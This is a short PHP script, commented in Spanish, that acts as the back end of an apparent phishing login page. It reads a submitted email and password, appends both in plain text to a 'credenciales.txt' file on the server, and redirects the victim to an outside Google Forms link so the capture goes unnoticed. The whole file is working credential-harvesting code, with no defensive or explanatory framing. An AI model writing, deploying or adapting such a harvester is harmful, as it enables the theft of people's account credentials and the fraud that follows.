<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Guarda el archivo de texto en la misma carpeta del hosting
    $credentials = sprintf("%s,%s\n", $email, $password);
    $filePath = __DIR__ . '/credenciales.txt';
    $saved = file_put_contents($filePath, $credentials, FILE_APPEND | LOCK_EX);

    if ($saved === false) {
        echo "<h2>Error al guardar en el servidor</h2>";
        exit();
    }

    // Redirección final automática
    header("Location: https://forms.gle/qX13QMHbrFvLBL1E6");
    exit();
} else {
    header("Location: index.html");
    exit();
}
?>